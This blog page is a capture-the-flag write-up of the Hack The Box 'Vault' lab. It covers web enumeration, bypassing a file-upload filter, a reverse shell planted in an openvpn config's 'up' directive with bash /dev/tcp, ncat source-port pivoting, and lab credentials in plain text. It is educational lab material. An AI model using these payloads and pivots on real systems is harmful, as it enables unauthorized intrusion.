<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Vault - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Vault"><a href="#Hack-The-Box-Vault" class="headerlink" title="Hack The Box - Vault"></a>Hack The Box - Vault</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an <code>openvpn</code> config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is <code>10.10.10.109</code> I added it to <code>/etc/hosts</code> as <code>vault.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/vault/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC vault.htb</code><br><img src="/images/hackthebox/vault/1.png" alt=""><br>Only two ports are open : 80 running http and 22 running ssh. As always we will check http.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p>The main page is just displaying this message :<br><img src="/images/hackthebox/vault/2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Slowdaddy web interface</span><br><span class="line"></span><br><span class="line">We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.</span><br><span class="line"></span><br><span class="line">We are proud to announce our first client: Sparklays (Sparklays.com still under construction)</span><br></pre></td></tr></table></figure>
<p>I ran <code>gobuster</code> but didn’t get anything , so I looked at the message again and noticed this line : <code>We are proud to announce our first client: Sparklays (Sparklays.com still under construction)</code>. So I went to <code>/sparklays</code> and got a <code>403</code> response.<br><img src="/images/hackthebox/vault/3.png" alt=""><br>So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;vault.htb&#x2F;sparklays&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;04&#x2F;05 14:55:32 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;admin.php (Status: 200)</span><br><span class="line">&#x2F;design (Status: 301)</span><br></pre></td></tr></table></figure>
<p><code>/admin.php</code> sounds interesting. But in fact it’s useless.<br><code>/admin.php</code> :<br><img src="/images/hackthebox/vault/4.png" alt=""><br>It asks for authentication , I tried <code>test:test</code> and got nothing. It didn’t print anything :<br><img src="/images/hackthebox/vault/5.png" alt=""><br>And I also noticed that it’s sending the login data through <code>GET</code> parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time.<br><code>/design</code> :<br><img src="/images/hackthebox/vault/6.png" alt=""><br>Design gave us a <code>403</code> response , I ran gobuster one more time and got these results :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;vault.htb&#x2F;sparklays&#x2F;design&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;04&#x2F;05 15:03:20 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br></pre></td></tr></table></figure>
<p>So I checked <code>/uploads</code> :<br><img src="/images/hackthebox/vault/7.png" alt=""><br>And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions <code>php</code> and <code>html</code> and got a new result : <code>design.html</code><br><code>/design.html</code> :<br><img src="/images/hackthebox/vault/8.png" alt=""><br>There’s a link titled <code>Change Logo</code> which takes us to this upload page :<br><img src="/images/hackthebox/vault/9.png" alt=""></p>
<h2 id="Bypassing-Restricted-File-Upload"><a href="#Bypassing-Restricted-File-Upload" class="headerlink" title="Bypassing Restricted File Upload"></a>Bypassing Restricted File Upload</h2><p>I created a small <code>php</code> script to get a reverse shell :<br><img src="/images/hackthebox/vault/10.png" alt=""><br>And named it <code>shell.php</code>.<br>Tried to upload and as expected , it told us that this file type is not allowed :<br><img src="/images/hackthebox/vault/11.png" alt=""><br>We need to know what are the allowed file types , We will use Zap’s fuzzer and a <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" target="_blank" rel="noopener">file extenstions wordlist</a> I got from seclists.<br>Intercept the request –&gt; right click –&gt; attack –&gt; Fuzzer<br><img src="/images/hackthebox/vault/12.png" alt=""><br><img src="/images/hackthebox/vault/13.png" alt=""><br><img src="/images/hackthebox/vault/14.png" alt=""><br>By filtering the response body size we will notice that all the responses are <code>519</code> bytes except the response of <code>.php5</code> which is <code>526</code> bytes. So it allows files with extension <code>.php5</code> to be uploaded.<br><img src="/images/hackthebox/vault/15.png" alt=""><br>Since the request has already been sent then the php shell is on the server now , Let’s excute it :<br><img src="/images/hackthebox/vault/16.png" alt=""><br><img src="/images/hackthebox/vault/17.png" alt=""><br>There are two users on the box <code>alex</code> and <code>dave</code> , user flag is not on the box. On the desktop of <code>dave</code> there is a file called <code>ssh</code> which has ssh credentials :<br><img src="/images/hackthebox/vault/18.png" alt=""><br><img src="/images/hackthebox/vault/19.png" alt=""><br>Now we can get an ssh connection as <code>dave</code> instead of this reverse shell as <code>www-data</code><br><code>dave : Dav3therav3123</code> :<br><img src="/images/hackthebox/vault/20.png" alt=""></p>
<h2 id="Escaping-from-ubuntu-to-DNS-openvpn-reverse-shell-Getting-user"><a href="#Escaping-from-ubuntu-to-DNS-openvpn-reverse-shell-Getting-user" class="headerlink" title="Escaping from ubuntu to DNS , openvpn reverse shell , Getting user"></a>Escaping from <code>ubuntu</code> to <code>DNS</code> , <code>openvpn</code> reverse shell , Getting user</h2><p>Let’s take a look at the rest of the files on dave’s desktop :<br><img src="/images/hackthebox/vault/21.png" alt=""><br>No idea what to do with that key <code>itscominghome</code> so we will leave it for now. The other file is <code>Servers</code> :<br><img src="/images/hackthebox/vault/22.png" alt=""><br>We have another ip now : <code>192.168.122.5</code> , We need to scan it but unfortunately <code>nmap</code> is not on the box :<br><img src="/images/hackthebox/vault/23.png" alt=""><br>Alternatively we will use <code>nc</code> to scan the first 100 ports like this :<br><code>nc -zv 192.168.122.5 1-100</code><br>Port 80 is open and running http :<br><img src="/images/hackthebox/vault/24.png" alt=""><br>Port 22 is open and running ssh :<br><img src="/images/hackthebox/vault/25.png" alt=""><br>We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :<br><code>ssh -L 1234:192.168.122.4:80 dave@vault.htb</code><br><img src="/images/hackthebox/vault/26.png" alt=""><br>Now we can go to <code>http://localhost:1234</code> and access that http service :<br><img src="/images/hackthebox/vault/27.png" alt=""><br>DNS configurator gives us a <code>404</code> response :<br><img src="/images/hackthebox/vault/28.png" alt=""><br>Vpn configurator allows us to create an <code>ovpn</code> file and execute it :<br><img src="/images/hackthebox/vault/29.png" alt=""><br>At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an <code>ovpn</code> file , and <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener">this article</a> really helped.<br>We are going to listen on the first host (<code>ubuntu</code>) and use the <code>ovpn</code> configurator to get a reverse shell on the second host (<code>DNS</code>) , We need to know the ip address of <code>ubuntu</code> on that subnet, <code>ifconfig</code> :<br><img src="/images/hackthebox/vault/30.png" alt=""><br>ip : <code>192.168.122.1</code><br>Reverse shell payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remote 192.168.122.1</span><br><span class="line">dev tun</span><br><span class="line">nobind</span><br><span class="line">script-security 2 </span><br><span class="line">up &quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.122.1&#x2F;9898 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/vault/31.png" alt=""><br>I used <code>nobind</code> because as you can see there’s a note saying that <code>nobind</code> must be used. Let’s update the file and click on <code>Test VPN</code> then check our listener :<br><img src="/images/hackthebox/vault/32.png" alt=""><br><img src="/images/hackthebox/vault/33.png" alt=""><br>And we owned user !</p>
<h2 id="SSH-on-DNS"><a href="#SSH-on-DNS" class="headerlink" title="SSH on DNS"></a>SSH on DNS</h2><p>In the <code>/home</code> directory of <code>dave</code> on <code>DNS</code> there’s a file called <code>ssh</code> which has ssh credentials :<br><img src="/images/hackthebox/vault/34.png" alt=""><br>So we can close that reverse shell and get an ssh connection on <code>DNS</code> as <code>dave</code> <code>dave : dav3gerous567</code>:<br><img src="/images/hackthebox/vault/35.png" alt=""><br>But we had <code>root</code> on <code>DNS</code> , now we are <code>dave</code>. We want to get root again. <code>sudo -l</code> tells us that <code>dave</code> can use sudo on any command :<br><img src="/images/hackthebox/vault/36.png" alt=""><br>So we can easily get <code>root</code> again by <code>sudo su</code> :<br><img src="/images/hackthebox/vault/37.png" alt=""></p>
<h2 id="Auth-log-Enumeration"><a href="#Auth-log-Enumeration" class="headerlink" title="Auth.log Enumeration"></a>Auth.log Enumeration</h2><p>By looking at <code>Servers</code> file again , which was on <code>ubuntu</code><br><img src="/images/hackthebox/vault/22.png" alt=""><br>We notice that there’s a host called <code>The Vault</code> and its ip is not there , so probably we need to get to that host , but we need its ip first.<br>After a lot of enumeration I looked into <code>auth.log</code> and noticed that on the 2nd of September at <code>15:10:20</code> and <code>15:10:34</code> these commands were executed :<br>Part of the log :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root</span><br><span class="line">Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid&#x3D;0)</span><br><span class="line">Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Sep  2 15:10:20 DNS sudo:     dave : TTY&#x3D;pts&#x2F;0 ; PWD&#x3D;&#x2F;home&#x2F;dave ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;usr&#x2F;bin&#x2F;ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</span><br><span class="line">Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid&#x3D;0)</span><br><span class="line">Sep  2 15:10:34 DNS sudo:     dave : TTY&#x3D;pts&#x2F;0 ; PWD&#x3D;&#x2F;home&#x2F;dave ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;usr&#x2F;bin&#x2F;ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53</span><br><span class="line">Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by</span><br><span class="line">dave(uid&#x3D;0)</span><br><span class="line">Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/vault/38.png" alt=""><br>Commands :<br><code>/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</code><br><code>/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53</code><br>We have an ip (<code>192.168.5.2</code>) and we suspect that its the one we are looking for. I was using <code>less</code> to view the log so I searched for the ip to see if it was mentioned anywhere else <code>:?192.168.5.2</code>, And I found it here too :<br><img src="/images/hackthebox/vault/39.png" alt=""><br>Command :<br><code>/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444</code><br>On the same day at <code>15:07:51</code> That ip was scanned with <code>nmap</code> , and we notice <code>--source-port=4444</code> , what’s that ?</p>
<h2 id="Source-Port-Escaping-from-DNS-to-vault"><a href="#Source-Port-Escaping-from-DNS-to-vault" class="headerlink" title="Source Port , Escaping from DNS to vault"></a>Source Port , Escaping from <code>DNS</code> to <code>vault</code></h2><p>Let’s take that nmap command and run it again to see the results :<br><img src="/images/hackthebox/vault/40.png" alt=""><br>Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :<br><code>nmap -Pn 192.168.5.2</code><br><img src="/images/hackthebox/vault/41.png" alt=""><br>Port 53 and 4444 , both of them are closed. weird … where is port 987 ?<br>So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.<br>To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use <code>ncat</code> and make it listen on port 2222 , then the service running on that port will be another <code>ncat</code> connection from port 4444 to port 987 on <code>192.168.5.2</code><br><code>ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot;</code><br><img src="/images/hackthebox/vault/42.png" alt=""><br>We will get another ssh connection to <code>DNS</code> , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately <code>nmap</code> can’t tell us because our connection is not direct.<br><img src="/images/hackthebox/vault/43.png" alt=""><br>So I guessed common services and it was <code>ssh</code> :<br><img src="/images/hackthebox/vault/44.png" alt=""><br>I tried <code>dave</code> as the username and <code>dav3gerous567</code> as the password (same credentials for <code>DNS</code>) and it worked. </p>
<h2 id="Decrypting-root-flag"><a href="#Decrypting-root-flag" class="headerlink" title="Decrypting root flag"></a>Decrypting root flag</h2><p>In the <code>/home</code> directory of <code>dave</code> on <code>vault</code> there’s a file called <code>root.txt.gpg</code> :<br><img src="/images/hackthebox/vault/45.png" alt=""><br>Which is the root flag but gpg encrypted :<br><img src="/images/hackthebox/vault/46.png" alt=""><br>We need a key to decrypt the flag , remember the key we saw earlier on <code>ubuntu</code> ? We will copy the file to <code>ubuntu</code> to decrypt it , Easiest way to do it is to <code>base64</code> encode it then copy the <code>base64</code> data and decode it on <code>ubuntu</code>. But <code>base64</code> was not installed on <code>vault</code> so I used <code>base32</code> instead :<br><img src="/images/hackthebox/vault/47.png" alt=""><br><img src="/images/hackthebox/vault/48.png" alt=""><br><img src="/images/hackthebox/vault/49.png" alt=""><br>Now let’s decrypt it with the key : <code>itscominghome</code> :<br><code>gpg -d root.txt.gpg</code><br><img src="/images/hackthebox/vault/50.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
